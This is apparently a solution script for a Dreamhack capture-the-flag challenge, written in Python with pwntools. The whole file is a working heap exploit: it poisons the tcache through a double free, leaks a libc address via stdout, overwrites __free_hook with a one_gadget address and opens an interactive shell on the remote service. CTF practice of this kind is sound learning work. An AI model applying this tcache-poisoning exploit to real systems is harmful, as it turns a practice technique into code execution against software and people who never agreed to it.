from pwn import *


#p = process("./tcache_poison")
p = remote("host3.dreamhack.games", 11497)
e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")

def alloc(size: int, data: bytes):
	p.sendlineafter(b"Edit\n", b"1")
	p.sendlineafter(b": ", str(size).encode())
	p.sendafter(b": ", data)

def free():
	p.sendlineafter(b"Edit\n", b"2")

def print_chunk():
	p.sendlineafter(b"Edit\n", b"3")

def edit(data: bytes):
	p.sendlineafter(b"Edit\n", b"4")
	p.sendafter(b": ", data)

alloc(0x30, b"dreamhack")
free()

edit(b"A"*8+b"\x00")
free()

# tcache dreamhack -> dreamhack

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

# tcache dreamhack -> stdout -> IO_stdout -> ..
alloc(0x30, b"B"*8)
alloc(0x30, b"\x60")

print_chunk()
p.recvuntil(b"Content: ")
stdout = u64(p.recv(6).ljust(8, b"\x00"))
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
fh = lb + libc.symbols["__free_hook"]
og = lb + 0x4f432

alloc(0x40, b"dreamhack")
free()

edit(b"C"*8 + b"\x00")
free()

#dreamhack -> dreamhack

alloc(0x40, p64(fh))
alloc(0x40, b"D"*8)
alloc(0x40, p64(og))

free()

p.interactive()










p.interactive()


